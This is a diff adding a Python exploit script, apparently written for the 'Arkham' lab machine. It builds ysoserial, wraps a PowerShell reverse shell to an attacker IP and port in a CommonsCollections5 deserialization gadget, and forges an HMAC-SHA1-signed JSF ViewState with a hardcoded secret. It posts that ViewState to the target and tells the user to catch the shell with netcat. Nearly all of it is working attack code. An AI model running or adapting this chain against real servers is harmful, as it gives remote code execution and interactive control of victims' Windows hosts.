@@ -1,0 +1,255 @@
+#!/usr/bin/env python3
+
+import subprocess
+import os
+import sys
+import base64
+import hmac
+import hashlib
+import re
+import requests
+import time
+
+# Disable SSL warnings
+import urllib3
+urllib3.disable_warnings()
+
+# Configuration
+TARGET = "http://10.129.228.116:8080/userSubscribe.faces"
+ATTACKER_IP = "10.10.16.187"
+ATTACKER_PORT = "4444"
+SECRET = b"JsF9876-"
+YSOSERIAL_DIR = "/tmp/ysoserial_build"
+
+print("=" * 70)
+print("AUTO-FIX YSOSERIAL RCE - ARKHAM")
+print("=" * 70)
+print(f"[*] Target: {TARGET}")
+print(f"[*] Attacker: {ATTACKER_IP}:{ATTACKER_PORT}")
+print()
+
+# ============================================================================
+# STEP 1: Clone ysoserial
+# ============================================================================
+print("[STEP 1] Cloning ysoserial...")
+
+if os.path.exists(YSOSERIAL_DIR):
+    print(f"[*] Removing old directory: {YSOSERIAL_DIR}")
+    subprocess.run(["rm", "-rf", YSOSERIAL_DIR], timeout=30)
+
+try:
+    result = subprocess.run(
+        ["git", "clone", "https://github.com/frohoff/ysoserial.git", YSOSERIAL_DIR],
+        capture_output=True, text=True, timeout=60
+    )
+    if result.returncode != 0:
+        print("[-] Git clone failed!")
+        sys.exit(1)
+    print("[+] ysoserial cloned")
+except Exception as e:
+    print(f"[-] Error: {e}")
+    sys.exit(1)
+
+# ============================================================================
+# STEP 2: Fix pom.xml for Java 8+
+# ============================================================================
+print("\n[STEP 2] Fixing pom.xml for Java 8+ compatibility...")
+
+pom_file = f"{YSOSERIAL_DIR}/pom.xml"
+
+try:
+    with open(pom_file, 'r') as f:
+        pom_content = f.read()
+    
+    # Replace Java 6 with Java 8
+    pom_content = pom_content.replace('<source>6</source>', '<source>8</source>')
+    pom_content = pom_content.replace('<target>6</target>', '<target>8</target>')
+    
+    # Also try common variations
+    pom_content = pom_content.replace('<maven.compiler.source>6</maven.compiler.source>', 
+                                     '<maven.compiler.source>8</maven.compiler.source>')
+    pom_content = pom_content.replace('<maven.compiler.target>6</maven.compiler.target>', 
+                                     '<maven.compiler.target>8</maven.compiler.target>')
+    
+    with open(pom_file, 'w') as f:
+        f.write(pom_content)
+    
+    print("[+] pom.xml fixed")
+    
+except Exception as e:
+    print(f"[-] Error fixing pom.xml: {e}")
+    sys.exit(1)
+
+# ============================================================================
+# STEP 3: Build with Maven
+# ============================================================================
+print("\n[STEP 3] Building ysoserial with Maven...")
+
+try:
+    os.chdir(YSOSERIAL_DIR)
+    
+    print("[*] Running Maven build (this may take 2-3 minutes)...")
+    
+    result = subprocess.run(
+        ["mvn", "clean", "package", "-DskipTests", "-q"],
+        capture_output=True, text=True, timeout=300
+    )
+    
+    if result.returncode != 0:
+        print("[-] Maven build failed!")
+        print("[*] Trying with explicit Java version...")
+        
+        # Try with explicit options
+        result = subprocess.run(
+            ["mvn", "clean", "package", "-DskipTests", "-q",
+             "-Dmaven.compiler.source=8", "-Dmaven.compiler.target=8"],
+            capture_output=True, text=True, timeout=300
+        )
+        
+        if result.returncode != 0:
+            print("[-] Build still failed!")
+            print(result.stderr[-500:] if result.stderr else "No error message")
+            sys.exit(1)
+    
+    print("[+] ysoserial built successfully")
+    
+except Exception as e:
+    print(f"[-] Error: {e}")
+    sys.exit(1)
+
+# ============================================================================
+# STEP 4: Verify JAR
+# ============================================================================
+print("\n[STEP 4] Verifying JAR...")
+
+jar_file = f"{YSOSERIAL_DIR}/target/ysoserial-0.0.6-SNAPSHOT-all.jar"
+
+if not os.path.exists(jar_file):
+    print("[-] JAR not found!")
+    
+    # Try to find it
+    target_dir = f"{YSOSERIAL_DIR}/target"
+    if os.path.exists(target_dir):
+        jars = [f for f in os.listdir(target_dir) if f.endswith('.jar') and 'all' in f]
+        if jars:
+            jar_file = os.path.join(target_dir, jars[0])
+            print(f"[+] Found JAR: {jar_file}")
+        else:
+            print("[-] No suitable JAR found!")
+            sys.exit(1)
+    else:
+        print("[-] Target directory not found!")
+        sys.exit(1)
+
+print(f"[+] JAR verified: {jar_file}")
+
+# ============================================================================
+# STEP 5: Test ysoserial
+# ============================================================================
+print("\n[STEP 5] Testing ysoserial...")
+
+try:
+    result = subprocess.run(
+        ["java", "-jar", jar_file, "CommonsCollections5", "whoami"],
+        capture_output=True, timeout=30
+    )
+    
+    if len(result.stdout) < 100:
+        print("[-] Test failed!")
+        sys.exit(1)
+    
+    print("[+] ysoserial working")
+    
+except Exception as e:
+    print(f"[-] Test error: {e}")
+    sys.exit(1)
+
+# ============================================================================
+# STEP 6: Generate payload
+# ============================================================================
+print("\n[STEP 6] Generating Windows RCE payload...")
+
+ps_cmd = f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"$client=New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',{ATTACKER_PORT});$stream=$client.GetStream();[byte[]]$buffer=0..65535|%{{0}};while(($i=$stream.Read($buffer,0,$buffer.Length))-ne 0){{$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
+
+print(f"[*] Command length: {len(ps_cmd)} chars")
+
+try:
+    result = subprocess.run(
+        ["java", "-jar", jar_file, "CommonsCollections5", ps_cmd],
+        capture_output=True, timeout=60
+    )
+    
+    if len(result.stdout) < 100:
+        print("[-] Payload generation failed!")
+        sys.exit(1)
+    
+    # Encode to base64
+    payload_b64 = base64.b64encode(result.stdout).decode()
+    
+    print(f"[+] Payload generated: {len(result.stdout)} bytes")
+    
+except Exception as e:
+    print(f"[-] Error: {e}")
+    sys.exit(1)
+
+# ============================================================================
+# STEP 7: Sign payload
+# ============================================================================
+print("\n[STEP 7] Signing payload with HMAC-SHA1...")
+
+payload_bytes = base64.b64decode(payload_b64)
+signature = base64.b64encode(
+    hmac.new(SECRET, payload_bytes, hashlib.sha1).digest()
+).decode()
+
+malicious_viewstate = payload_b64 + "|" + signature
+
+print(f"[+] Signature: {signature}")
+print(f"[+] Final ViewState: {len(malicious_viewstate)} bytes")
+
+# ============================================================================
+# STEP 8: Send exploit
+# ============================================================================
+print("\n[STEP 8] Sending exploit to target...")
+
+session = requests.Session()
+session.verify = False
+
+try:
+    print("[*] Establishing session...")
+    r = session.get(TARGET, timeout=10)
+    print(f"[+] Connected: {r.status_code}")
+    
+    print("[*] Sending malicious ViewState...")
+    
+    data = {
+        "j_id_jsp_1623871077_1:email": "exploited@test.com",
+        "j_id_jsp_1623871077_1:submit": "SIGN UP",
+        "j_id_jsp_1623871077_1_SUBMIT": "1",
+        "javax.faces.ViewState": malicious_viewstate,
+    }
+    
+    r = session.post(TARGET, data=data, timeout=15)
+    
+    print(f"[+] Exploit sent: HTTP {r.status_code}")
+    print(f"[+] Response: {len(r.text)} bytes")
+    
+    print("\n[SUCCESS] Payload delivered!")
+    print("[!] Check your netcat listener...")
+    
+except Exception as e:
+    print(f"[-] Error: {e}")
+    sys.exit(1)
+
+# ============================================================================
+# Summary
+# ============================================================================
+print("\n" + "=" * 70)
+print("[+] EXPLOITATION COMPLETE")
+print()
+print(f"[*] Listen with: nc -nlvp {ATTACKER_PORT}")
+print()
+print("[*] Expected output:")
+print("    Connection from 10.129.228.116 XXXXX received!")
+print("    PS C:\\>")
+print("=" * 70)
